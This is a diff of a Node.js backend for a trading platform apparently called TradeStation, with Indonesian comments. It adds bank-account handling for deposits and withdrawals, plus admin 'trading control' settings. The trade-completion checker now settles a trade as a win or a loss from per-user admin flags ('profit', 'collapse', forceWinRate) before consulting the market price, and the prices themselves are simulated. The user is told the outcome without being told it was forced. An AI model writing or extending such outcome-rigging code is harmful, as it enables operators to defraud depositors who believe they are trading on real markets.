@@ -31,7 +31,7 @@ app.use(helmet({
 app.use(cors({
     origin: ["https://ts-traderstation.com", "http://localhost:3000", "http://127.0.0.1:5500"],
     credentials: true,
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
@@ -53,7 +53,7 @@ const authLimiter = rateLimit({
     message: 'Too many authentication attempts, please try again later.'
 });
 
-// Database Models
+// Database Models - UPDATED dengan Bank Data
 const userSchema = new mongoose.Schema({
     name: { type: String, required: true },
     email: { type: String, required: true, unique: true },
@@ -65,13 +65,34 @@ const userSchema = new mongoose.Schema({
     totalProfit: { type: Number, default: 0 },
     totalLoss: { type: Number, default: 0 },
     referralCode: { type: String, unique: true },
+    // Bank Data untuk Withdrawal
+    bankData: {
+        bankName: { type: String },
+        accountNumber: { type: String },
+        accountHolder: { type: String }
+    },
+    // Admin Settings untuk User Trading
+    adminSettings: {
+        forceWin: { type: Boolean, default: false },
+        forceWinRate: { type: Number, default: 0 }, // 0-100%, digunakan jika forceWin true
+        profitCollapse: { type: String, enum: ['profit', 'collapse', 'normal'], default: 'normal' }
+    },
     stats: {
         totalTrades: { type: Number, default: 0 },
         winTrades: { type: Number, default: 0 },
-        loseTrades: { type: Number, default: 0 },
-        winRate: { type: Number, default: 0 }
+        loseTrades: { type: Number, default: 0 }
     },
     lastLoginAt: { type: Date },
+    createdAt: { type: Date, default: Date.now }
+});
+
+// Bank Account Schema untuk Admin Panel
+const bankAccountSchema = new mongoose.Schema({
+    bankName: { type: String, required: true },
+    accountNumber: { type: String, required: true },
+    accountHolder: { type: String, required: true },
+    isActive: { type: Boolean, default: true },
+    note: { type: String },
     createdAt: { type: Date, default: Date.now }
 });
 
@@ -89,16 +110,21 @@ const tradeSchema = new mongoose.Schema({
     payout: { type: Number },
     priceChangePercent: { type: Number },
     forceResult: { type: String }, // admin override
+    adminForced: { type: Boolean, default: false }, // flag untuk admin control
     createdAt: { type: Date, default: Date.now },
     completedAt: { type: Date }
 });
 
+// Updated Deposit Schema dengan File Upload
 const depositSchema = new mongoose.Schema({
     userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
     amount: { type: Number, required: true },
     method: { type: String, default: 'Bank Transfer' },
     bankFrom: { type: String },
-    receipt: { type: String }, // URL atau text bukti transfer
+    receipt: { type: String }, // base64 file data
+    fileName: { type: String },
+    fileType: { type: String },
+    fileSize: { type: Number },
     status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
     adminNotes: { type: String },
     transferTime: { type: Date },
@@ -106,6 +132,7 @@ const depositSchema = new mongoose.Schema({
     processedAt: { type: Date }
 });
 
+// Updated Withdrawal Schema dengan Bank Account
 const withdrawalSchema = new mongoose.Schema({
     userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
     amount: { type: Number, required: true },
@@ -138,6 +165,7 @@ const activitySchema = new mongoose.Schema({
 
 // Create models
 const User = mongoose.model('User', userSchema);
+const BankAccount = mongoose.model('BankAccount', bankAccountSchema);
 const Trade = mongoose.model('Trade', tradeSchema);
 const Deposit = mongoose.model('Deposit', depositSchema);
 const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
@@ -247,7 +275,7 @@ function simulatePriceUpdates() {
     }, 3000); // Update every 3 seconds
 }
 
-// Trade completion checker
+// Trade completion checker dengan Admin Settings
 function checkTradesToComplete() {
     setInterval(async () => {
         try {
@@ -271,11 +299,34 @@ function checkTradesToComplete() {
                         const priceChangePercent = ((currentPrice.price - trade.entryPrice) / trade.entryPrice) * 100;
                         trade.priceChangePercent = priceChangePercent;
                         
-                        // Determine result based on direction or force result
+                        // Determine result berdasarkan Admin Settings
                         let result;
-                        if (trade.forceResult) {
+                        
+                        // Check admin settings first
+                        if (trade.userId.adminSettings.profitCollapse === 'profit') {
+                            result = 'win';
+                            trade.adminForced = true;
+                            trade.forceResult = 'win';
+                        } else if (trade.userId.adminSettings.profitCollapse === 'collapse') {
+                            result = 'lose';
+                            trade.adminForced = true;
+                            trade.forceResult = 'lose';
+                        } else if (trade.forceResult) {
+                            // Manual admin override
                             result = trade.forceResult;
+                            trade.adminForced = true;
+                        } else if (trade.userId.adminSettings.forceWin && trade.userId.adminSettings.forceWinRate > 0) {
+                            // Force win rate
+                            const winChance = Math.random() * 100;
+                            if (winChance <= trade.userId.adminSettings.forceWinRate) {
+                                result = 'win';
+                                trade.adminForced = true;
+                            } else {
+                                result = 'lose';
+                                trade.adminForced = true;
+                            }
                         } else {
+                            // Natural market result
                             if (trade.direction === 'buy') {
                                 result = currentPrice.price > trade.entryPrice ? 'win' : 'lose';
                             } else {
@@ -295,20 +346,19 @@ function checkTradesToComplete() {
                             trade.userId.totalLoss += trade.amount;
                         }
                         
-                        // Update user stats
+                        // Update user stats (tanpa winRate)
                         trade.userId.stats.totalTrades += 1;
                         if (result === 'win') {
                             trade.userId.stats.winTrades += 1;
                         } else {
                             trade.userId.stats.loseTrades += 1;
                         }
-                        trade.userId.stats.winRate = (trade.userId.stats.winTrades / trade.userId.stats.totalTrades) * 100;
                         
                         await trade.save();
                         await trade.userId.save();
                         
                         // Log activity
-                        await logActivity(trade.userId._id, 'TRADE_COMPLETED', `${trade.symbol} ${trade.direction} ${result}`);
+                        await logActivity(trade.userId._id, 'TRADE_COMPLETED', `${trade.symbol} ${trade.direction} ${result} ${trade.adminForced ? '(Admin Controlled)' : ''}`);
                         
                         // Notify user via socket
                         io.to(trade.userId._id.toString()).emit('tradeCompleted', {
@@ -318,7 +368,7 @@ function checkTradesToComplete() {
                             newBalance: trade.userId.balance
                         });
                         
-                        console.log(`✅ Trade completed: ${trade._id} - ${result}`);
+                        console.log(`✅ Trade completed: ${trade._id} - ${result} ${trade.adminForced ? '(Admin Controlled)' : ''}`);
                     }
                 }
             }
@@ -343,44 +393,71 @@ const checkDatabaseConnection = (req, res, next) => {
 app.get('/', (req, res) => {
     res.json({
         message: 'TradeStation Backend API',
-        version: '1.0.0',
+        version: '2.0.0',
         status: 'Running',
+        features: ['Bank Account Management', 'File Upload', 'Admin Trading Control'],
         endpoints: {
             health: '/api/health',
             register: 'POST /api/register',
             login: 'POST /api/login',
             prices: 'GET /api/prices',
             profile: 'GET /api/profile (auth required)',
+            bank: 'GET /api/profile/bank (auth required)',
             trading: 'POST /api/trade (auth required)',
             admin: '/api/admin/* (admin required)'
         },
-        documentation: 'https://github.com/tradestation/api-docs',
         timestamp: new Date().toISOString()
     });
 });
 
-// API Routes
+// Health check
+app.get('/api/health', (req, res) => {
+    const health = {
+        status: 'OK', 
+        message: 'TradeStation Backend is running',
+        timestamp: new Date().toISOString(),
+        environment: process.env.NODE_ENV || 'development',
+        database: global.dbConnected !== false ? 'Connected' : 'Disconnected',
+        port: process.env.PORT || 3000
+    };
+    
+    res.json(health);
+});
 
-// Health check - moved to server startup section
-
-// Auth Routes
+// Auth Routes - UPDATED untuk support email/phone
 app.post('/api/register', authLimiter, checkDatabaseConnection, async (req, res) => {
     try {
         const { name, email, phone, password } = req.body;
         
         // Validation
-        if (!name || !email || !password) {
-            return res.status(400).json({ error: 'Name, email, and password are required' });
+        if (!name || !password) {
+            return res.status(400).json({ error: 'Name and password are required' });
+        }
+        
+        if (!email && !phone) {
+            return res.status(400).json({ error: 'Email or phone is required' });
         }
         
         if (password.length < 6) {
             return res.status(400).json({ error: 'Password must be at least 6 characters' });
         }
         
+        // Set email jika hanya ada phone
+        let userEmail = email;
+        if (!email && phone) {
+            userEmail = `${phone}@phone.temp`;
+        }
+        
         // Check if user exists
-        const existingUser = await User.findOne({ email });
+        const existingUser = await User.findOne({ 
+            $or: [
+                { email: userEmail },
+                { phone: phone }
+            ]
+        });
+        
         if (existingUser) {
-            return res.status(400).json({ error: 'Email already registered' });
+            return res.status(400).json({ error: 'Email or phone already registered' });
         }
         
         // Hash password
@@ -389,17 +466,17 @@ app.post('/api/register', authLimiter, checkDatabaseConnection, async (req, res)
         // Create user
         const user = new User({
             name,
-            email,
+            email: userEmail,
             phone,
             password: hashedPassword,
             referralCode: generateReferralCode(),
-            balance: 0 // Start with 0 balance
+            balance: 0
         });
         
         await user.save();
         
         // Log activity
-        await logActivity(user._id, 'USER_REGISTER', `New user registered: ${email}`);
+        await logActivity(user._id, 'USER_REGISTER', `New user registered: ${userEmail}`);
         
         // Generate token
         const token = jwt.sign(
@@ -426,15 +503,20 @@ app.post('/api/register', authLimiter, checkDatabaseConnection, async (req, res)
 
 app.post('/api/login', authLimiter, checkDatabaseConnection, async (req, res) => {
     try {
-        const { email, password } = req.body;
+        const { email, password } = req.body; // email bisa berisi email atau phone
         
-        // Validation
         if (!email || !password) {
-            return res.status(400).json({ error: 'Email and password are required' });
+            return res.status(400).json({ error: 'Email/Phone and password are required' });
         }
         
-        // Find user
-        const user = await User.findOne({ email });
+        // Check if input is email or phone
+        let user;
+        if (email.includes('@')) {
+            user = await User.findOne({ email });
+        } else {
+            user = await User.findOne({ phone: email });
+        }
+        
         if (!user) {
             return res.status(400).json({ error: 'Invalid credentials' });
         }
@@ -443,27 +525,22 @@ app.post('/api/login', authLimiter, checkDatabaseConnection, async (req, res) =>
             return res.status(400).json({ error: 'Account is deactivated' });
         }
         
-        // Check password
         const isValidPassword = await bcrypt.compare(password, user.password);
         if (!isValidPassword) {
             return res.status(400).json({ error: 'Invalid credentials' });
         }
         
-        // Update last login
         user.lastLoginAt = new Date();
         await user.save();
         
-        // Log activity
         await logActivity(user._id, 'USER_LOGIN', `User logged in: ${email}`);
         
-        // Generate token
         const token = jwt.sign(
             { userId: user._id },
             process.env.JWT_SECRET,
             { expiresIn: '7d' }
         );
         
-        // Remove password from response
         const userResponse = user.toObject();
         delete userResponse.password;
         
@@ -504,6 +581,46 @@ app.put('/api/profile', authenticateToken, async (req, res) => {
     } catch (error) {
         console.error('Profile update error:', error);
         res.status(500).json({ error: 'Failed to update profile' });
+    }
+});
+
+// Bank Data Routes - BARU
+app.get('/api/profile/bank', authenticateToken, async (req, res) => {
+    try {
+        const user = await User.findById(req.userId).select('bankData');
+        res.json(user.bankData || {});
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to load bank data' });
+    }
+});
+
+app.put('/api/profile/bank', authenticateToken, async (req, res) => {
+    try {
+        const { bankName, accountNumber, accountHolder } = req.body;
+        
+        const user = await User.findByIdAndUpdate(
+            req.userId,
+            { 
+                bankData: { bankName, accountNumber, accountHolder }
+            },
+            { new: true }
+        );
+        
+        await logActivity(req.userId, 'BANK_DATA_UPDATE', `Bank data updated: ${bankName}`);
+        
+        res.json(user.bankData);
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to update bank data' });
+    }
+});
+
+// Active Bank Accounts untuk Deposit - BARU
+app.get('/api/bank-accounts/active', async (req, res) => {
+    try {
+        const accounts = await BankAccount.find({ isActive: true });
+        res.json(accounts);
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to load bank accounts' });
     }
 });
 
@@ -600,26 +717,36 @@ app.get('/api/trades', authenticateToken, async (req, res) => {
     }
 });
 
-// Deposit Routes
+// Deposit Routes - UPDATED dengan File Upload
 app.post('/api/deposit', authenticateToken, async (req, res) => {
     try {
-        const { amount, bankFrom, receipt, transferTime } = req.body;
+        const { amount, receipt, fileName, fileType } = req.body;
         
         if (!amount || amount < 50000) {
             return res.status(400).json({ error: 'Minimum deposit is Rp 50,000' });
         }
         
+        if (!receipt) {
+            return res.status(400).json({ error: 'Payment proof is required' });
+        }
+        
+        // Validate file type
+        const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png'];
+        if (!allowedTypes.includes(fileType)) {
+            return res.status(400).json({ error: 'Invalid file type' });
+        }
+        
         const deposit = new Deposit({
             userId: req.userId,
             amount,
-            bankFrom,
             receipt,
-            transferTime: transferTime || new Date()
+            fileName,
+            fileType,
+            transferTime: new Date()
         });
         
         await deposit.save();
         
-        // Log activity
         await logActivity(req.userId, 'DEPOSIT_REQUEST', `Deposit request: ${amount}`);
         
         res.status(201).json({
@@ -645,48 +772,49 @@ app.get('/api/deposits', authenticateToken, async (req, res) => {
     }
 });
 
-// Withdrawal Routes
+// Withdrawal Routes - UPDATED dengan Bank Data
 app.post('/api/withdrawal', authenticateToken, async (req, res) => {
     try {
-        const { amount, bankAccount } = req.body;
+        const { amount } = req.body;
         
         if (!amount || amount < 100000) {
             return res.status(400).json({ error: 'Minimum withdrawal is Rp 100,000' });
         }
         
-        if (amount > req.user.balance) {
+        const user = await User.findById(req.userId);
+        
+        if (amount > user.balance) {
             return res.status(400).json({ error: 'Insufficient balance' });
         }
         
-        // Calculate fee (1% with minimum Rp 6,500)
+        if (!user.bankData || !user.bankData.bankName) {
+            return res.status(400).json({ error: 'Bank data is required' });
+        }
+        
+        // Calculate fee
         const fee = Math.max(6500, amount * 0.01);
         const finalAmount = amount - fee;
         
-        if (finalAmount <= 0) {
-            return res.status(400).json({ error: 'Amount too small after fee deduction' });
-        }
-        
         // Deduct amount from user balance
-        req.user.balance -= amount;
-        await req.user.save();
+        user.balance -= amount;
+        await user.save();
         
         const withdrawal = new Withdrawal({
             userId: req.userId,
             amount,
             fee,
             finalAmount,
-            bankAccount
+            bankAccount: user.bankData
         });
         
         await withdrawal.save();
         
-        // Log activity
         await logActivity(req.userId, 'WITHDRAWAL_REQUEST', `Withdrawal request: ${amount}`);
         
         res.status(201).json({
             message: 'Withdrawal request submitted successfully',
             withdrawal,
-            newBalance: req.user.balance
+            newBalance: user.balance
         });
         
     } catch (error) {
@@ -707,7 +835,7 @@ app.get('/api/withdrawals', authenticateToken, async (req, res) => {
     }
 });
 
-// Admin Routes
+// Admin Routes - UPDATED dengan Trading Control dan Bank Management
 app.get('/api/admin/dashboard', authenticateToken, requireAdmin, async (req, res) => {
     try {
         // Get statistics
@@ -719,6 +847,8 @@ app.get('/api/admin/dashboard', authenticateToken, requireAdmin, async (req, res
         const pendingDeposits = await Deposit.countDocuments({ status: 'pending' });
         const totalWithdrawals = await Withdrawal.countDocuments();
         const pendingWithdrawals = await Withdrawal.countDocuments({ status: 'pending' });
+        const totalBankAccounts = await BankAccount.countDocuments();
+        const activeBankAccounts = await BankAccount.countDocuments({ isActive: true });
         
         // Calculate volumes
         const allTrades = await Trade.find({ status: 'completed' });
@@ -743,6 +873,7 @@ app.get('/api/admin/dashboard', authenticateToken, requireAdmin, async (req, res
             trades: { total: totalTrades, active: activeTrades },
             deposits: { total: totalDeposits, pending: pendingDeposits },
             withdrawals: { total: totalWithdrawals, pending: pendingWithdrawals },
+            bankAccounts: { total: totalBankAccounts, active: activeBankAccounts },
             volume: { total: totalVolume, today: todayVolume }
         };
         
@@ -777,13 +908,28 @@ app.get('/api/admin/users/:userId', authenticateToken, requireAdmin, async (req,
     }
 });
 
+// UPDATED: User Management dengan Trading Control
 app.put('/api/admin/user/:userId', authenticateToken, requireAdmin, async (req, res) => {
     try {
-        const { name, email, balance, phone, accountType, isActive } = req.body;
+        const { name, email, balance, phone, accountType, isActive, adminSettings } = req.body;
+        
+        const updateData = {
+            name, 
+            email, 
+            balance, 
+            phone, 
+            accountType, 
+            isActive
+        };
+        
+        // Update admin settings jika ada
+        if (adminSettings) {
+            updateData.adminSettings = adminSettings;
+        }
         
         const user = await User.findByIdAndUpdate(
             req.params.userId,
-            { name, email, balance, phone, accountType, isActive },
+            updateData,
             { new: true }
         ).select('-password');
         
@@ -793,6 +939,33 @@ app.put('/api/admin/user/:userId', authenticateToken, requireAdmin, async (req, 
     } catch (error) {
         console.error('Admin user update error:', error);
         res.status(500).json({ error: 'Failed to update user' });
+    }
+});
+
+// BARU: Trading Control untuk User
+app.put('/api/admin/user/:userId/trading-control', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+        const { profitCollapse, forceWin, forceWinRate } = req.body;
+        
+        const user = await User.findByIdAndUpdate(
+            req.params.userId,
+            {
+                'adminSettings.profitCollapse': profitCollapse,
+                'adminSettings.forceWin': forceWin,
+                'adminSettings.forceWinRate': forceWinRate
+            },
+            { new: true }
+        ).select('-password');
+        
+        await logActivity(req.params.userId, 'ADMIN_TRADING_CONTROL', `Trading control updated: ${profitCollapse}`);
+        
+        res.json({ 
+            message: 'Trading control updated',
+            user 
+        });
+    } catch (error) {
+        console.error('Admin trading control error:', error);
+        res.status(500).json({ error: 'Failed to update trading control' });
     }
 });
 
@@ -834,6 +1007,8 @@ app.put('/api/admin/trade/:tradeId', authenticateToken, requireAdmin, async (req
             { forceResult },
             { new: true }
         );
+        
+        await logActivity(trade.userId, 'ADMIN_TRADE_CONTROL', `Trade ${forceResult} forced by admin`);
         
         res.json({ trade });
     } catch (error) {
@@ -942,6 +1117,83 @@ app.put('/api/admin/withdrawal/:withdrawalId', authenticateToken, requireAdmin, 
     }
 });
 
+// BARU: Bank Account Management Routes
+app.get('/api/admin/bank-accounts', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+        const accounts = await BankAccount.find().sort({ createdAt: -1 });
+        res.json({ accounts });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to load bank accounts' });
+    }
+});
+
+app.post('/api/admin/bank-accounts', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+        const { bankName, accountNumber, accountHolder, note } = req.body;
+        
+        const account = new BankAccount({
+            bankName,
+            accountNumber,
+            accountHolder,
+            note
+        });
+        
+        await account.save();
+        await logActivity(req.userId, 'BANK_ACCOUNT_CREATE', `Bank account created: ${bankName} - ${accountNumber}`);
+        
+        res.status(201).json({ account });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to create bank account' });
+    }
+});
+
+app.put('/api/admin/bank-accounts/:id', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+        const { isActive, bankName, accountNumber, accountHolder, note } = req.body;
+        
+        const account = await BankAccount.findByIdAndUpdate(
+            req.params.id,
+            { isActive, bankName, accountNumber, accountHolder, note },
+            { new: true }
+        );
+        
+        await logActivity(req.userId, 'BANK_ACCOUNT_UPDATE', `Bank account updated: ${bankName}`);
+        
+        res.json({ account });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to update bank account' });
+    }
+});
+
+app.patch('/api/admin/bank-accounts/:id/toggle', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+        const account = await BankAccount.findById(req.params.id);
+        account.isActive = !account.isActive;
+        await account.save();
+        
+        await logActivity(req.userId, 'BANK_ACCOUNT_TOGGLE', `Bank account ${account.isActive ? 'activated' : 'deactivated'}: ${account.bankName}`);
+        
+        res.json({ 
+            message: `Bank account ${account.isActive ? 'activated' : 'deactivated'}`,
+            account 
+        });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to toggle bank account status' });
+    }
+});
+
+app.delete('/api/admin/bank-accounts/:id', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+        const account = await BankAccount.findByIdAndDelete(req.params.id);
+        
+        await logActivity(req.userId, 'BANK_ACCOUNT_DELETE', `Bank account deleted: ${account.bankName}`);
+        
+        res.json({ message: 'Bank account deleted successfully' });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to delete bank account' });
+    }
+});
+
 // Socket.IO connection handling
 io.on('connection', (socket) => {
     console.log('👤 User connected:', socket.id);
@@ -960,7 +1212,18 @@ io.on('connection', (socket) => {
     });
 });
 
-// Start server first, then connect to database
+// Global error handler
+app.use((error, req, res, next) => {
+    console.error('❌ Global error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+});
+
+// 404 handler
+app.use('*', (req, res) => {
+    res.status(404).json({ error: 'Route not found' });
+});
+
+// Start server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', async () => {
     console.log(`
@@ -969,6 +1232,8 @@ server.listen(PORT, '0.0.0.0', async () => {
 🌍 Environment: ${process.env.NODE_ENV || 'development'}
 📡 Socket.IO: Enabled
 🛡️  Security: Enabled
+💳 Bank Management: Enabled
+🎯 Trading Control: Enabled
 ⏰ Timestamp: ${new Date().toISOString()}
 `);
 
@@ -977,11 +1242,12 @@ server.listen(PORT, '0.0.0.0', async () => {
         await mongoose.connect(process.env.MONGODB_URI, {
             useNewUrlParser: true,
             useUnifiedTopology: true,
-            serverSelectionTimeoutMS: 10000, // 10 second timeout
-            socketTimeoutMS: 45000, // 45 second timeout
+            serverSelectionTimeoutMS: 10000,
+            socketTimeoutMS: 45000,
         });
         
         console.log('✅ Connected to MongoDB');
+        global.dbConnected = true;
         
         // Initialize default admin user
         const adminExists = await User.findOne({ email: 'admin@tradestation.com' });
@@ -999,51 +1265,46 @@ server.listen(PORT, '0.0.0.0', async () => {
             console.log('✅ Default admin user created');
         }
         
+        // Initialize sample bank accounts
+        const bankExists = await BankAccount.findOne();
+        if (!bankExists) {
+            const sampleBanks = [
+                {
+                    bankName: 'Bank BCA',
+                    accountNumber: '1234567890',
+                    accountHolder: 'TradeStation Official',
+                    note: 'Primary deposit account',
+                    isActive: true
+                },
+                {
+                    bankName: 'Bank Mandiri',
+                    accountNumber: '0987654321',
+                    accountHolder: 'TradeStation Official',
+                    note: 'Secondary deposit account',
+                    isActive: true
+                }
+            ];
+            
+            for (const bank of sampleBanks) {
+                await BankAccount.create(bank);
+            }
+            console.log('✅ Sample bank accounts created');
+        }
+        
         // Initialize prices
         await initializePrices();
         console.log('✅ Prices initialized');
         
-        // Start price updates and trade checking
+        // Start background processes
         simulatePriceUpdates();
         checkTradesToComplete();
         console.log('✅ Background processes started');
         
     } catch (error) {
         console.error('❌ MongoDB connection error:', error);
-        console.error('❌ Server will continue running but database features will be unavailable');
-        
-        // Don't exit, let server run for health checks
-        // Add a flag to indicate DB is not available
         global.dbConnected = false;
     }
 });
-
-// Health check that works even without DB
-app.get('/api/health', (req, res) => {
-    const health = {
-        status: 'OK', 
-        message: 'TradeStation Backend is running',
-        timestamp: new Date().toISOString(),
-        environment: process.env.NODE_ENV || 'development',
-        database: global.dbConnected !== false ? 'Connected' : 'Disconnected',
-        port: PORT
-    };
-    
-    res.json(health);
-});
-
-// Global error handler
-app.use((error, req, res, next) => {
-    console.error('❌ Global error:', error);
-    res.status(500).json({ error: 'Internal server error' });
-});
-
-// 404 handler
-app.use('*', (req, res) => {
-    res.status(404).json({ error: 'Route not found' });
-});
-
-// Graceful shutdown (moved after server start)
 
 // Graceful shutdown
 process.on('SIGTERM', () => {
